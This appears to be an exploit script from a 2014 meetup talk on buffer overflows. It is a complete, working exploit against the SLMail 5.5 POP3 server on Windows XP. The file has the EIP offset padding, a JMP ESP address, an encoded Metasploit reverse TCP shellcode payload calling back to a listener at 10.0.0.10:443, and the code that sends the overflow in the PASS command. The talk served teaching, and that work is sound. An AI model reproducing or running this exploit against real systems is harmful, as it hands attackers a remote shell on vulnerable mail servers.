#!/usr/bin/python
# kassel codemeetup 10.09.2014 - buffer overflow exploiting talk 
# injecting reverse tcp shell payload generated by metasploit
# make sure to have netcat listener running on IP 10.0.0.10 at port 443
# if the ip adresses differ it is required to generate a new payload
# This is a working exploit for SLMail 5.5 on Windows XP SP2!

import socket

# AF_INET = IPv4, SOCK_STREAM = TCP, SOCK_DGREAM = UDP
# See http://openbook.galileocomputing.de/python/python_kapitel_20_001.htm
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# padding to reach EIP offset
padding = 'A' * 2606

# overwrite saved EIP on the stack with address to jmp esp instruction in slmfc.dll at 77972CA8 ---little endian---> \xa8\x2c\x97\x77
EIP = '\xa8\x2c\x97\x77'

# 10 nops for demonstration purposes
nops = '\x90' * 10 

# payload generated by metasploit using msfpayload and msfencode to substitude bad characters and use polymorphic encododer shikata_ga_nai
# command: "/opt/metasploit/app/msfpayload windows/shell_reverse_tcp EXITFUNC=thread LHOST=10.0.0.10 LPORT=443 R | msfencode -b '\x00\x0a\x0d' -e x86/shikata_ga_nai"
# using EXITFUNC=thread so that the mailserver does not crash after successfull exploitation (only thread not whole process gets ended)

# windows/shell_reverse_tcp - 314 bytes
# http://www.metasploit.com
# VERBOSE=false, LHOST=10.0.0.10, LPORT=443, 
# ReverseConnectRetries=5, ReverseListenerBindPort=0, 
# ReverseAllowProxy=false, PrependMigrate=false, 
# EXITFUNC=process, InitialAutoRunScript=, AutoRunScript=

payload = (
"\xdd\xc6\xb8\xa6\x76\xf9\xa1\xd9\x74\x24\xf4\x5a\x33\xc9" +
"\xb1\x4f\x31\x42\x19\x03\x42\x19\x83\xea\xfc\x44\x83\x05" +
"\x49\x01\x6c\xf6\x8a\x71\xe4\x13\xbb\xa3\x92\x50\xee\x73" +
"\xd0\x35\x03\xf8\xb4\xad\x90\x8c\x10\xc1\x11\x3a\x47\xec" +
"\xa2\x8b\x47\xa2\x61\x8a\x3b\xb9\xb5\x6c\x05\x72\xc8\x6d" +
"\x42\x6f\x23\x3f\x1b\xfb\x96\xaf\x28\xb9\x2a\xce\xfe\xb5" +
"\x13\xa8\x7b\x09\xe7\x02\x85\x5a\x58\x19\xcd\x42\xd2\x45" +
"\xee\x73\x37\x96\xd2\x3a\x3c\x6c\xa0\xbc\x94\xbd\x49\x8f" +
"\xd8\x11\x74\x3f\xd5\x68\xb0\xf8\x06\x1f\xca\xfa\xbb\x27" +
"\x09\x80\x67\xa2\x8c\x22\xe3\x14\x75\xd2\x20\xc2\xfe\xd8" +
"\x8d\x81\x59\xfd\x10\x46\xd2\xf9\x99\x69\x35\x88\xda\x4d" +
"\x91\xd0\xb9\xec\x80\xbc\x6c\x11\xd2\x19\xd0\xb7\x98\x88" +
"\x05\xc1\xc2\xc4\xea\xff\xfc\x14\x65\x88\x8f\x26\x2a\x22" +
"\x18\x0b\xa3\xec\xdf\x6c\x9e\x48\x4f\x93\x21\xa8\x59\x50" +
"\x75\xf8\xf1\x71\xf6\x93\x01\x7d\x23\x33\x52\xd1\x9c\xf3" +
"\x02\x91\x4c\x9b\x48\x1e\xb2\xbb\x72\xf4\xc5\xfc\xe5\xfd" +
"\xd5\x02\xfc\x69\xd4\x02\x01\xd1\x51\xe4\x6b\x35\x34\xbf" +
"\x03\xac\x1d\x4b\xb5\x31\x88\xdb\x56\xa3\x57\x1b\x10\xd8" +
"\xcf\x4c\x75\x2e\x06\x18\x6b\x09\xb0\x3e\x76\xcf\xfb\xfa" +
"\xad\x2c\x05\x03\x23\x08\x21\x13\xfd\x91\x6d\x47\x51\xc4" +
"\x3b\x31\x17\xbe\x8d\xeb\xc1\x6d\x44\x7b\x97\x5d\x57\xfd" +
"\x98\x8b\x21\xe1\x29\x62\x74\x1e\x85\xe2\x70\x67\xfb\x92" +
"\x7f\xb2\xbf\xb3\x9d\x16\xca\x5b\x38\xf3\x77\x06\xbb\x2e" +
"\xbb\x3f\x38\xda\x44\xc4\x20\xaf\x41\x80\xe6\x5c\x38\x99" +
"\x82\x62\xef\x9a\x86" ) 

buffer = padding + EIP + nops + payload 

# exception handler
try:
	print '\nSending buffer...'
	s.connect(('10.0.0.20',110))
	data=s.recv(1024)
	s.send('User test' + '\r\n')
	data=s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print '\n Done!'
except:
	print 'Could not connect to POP3!'
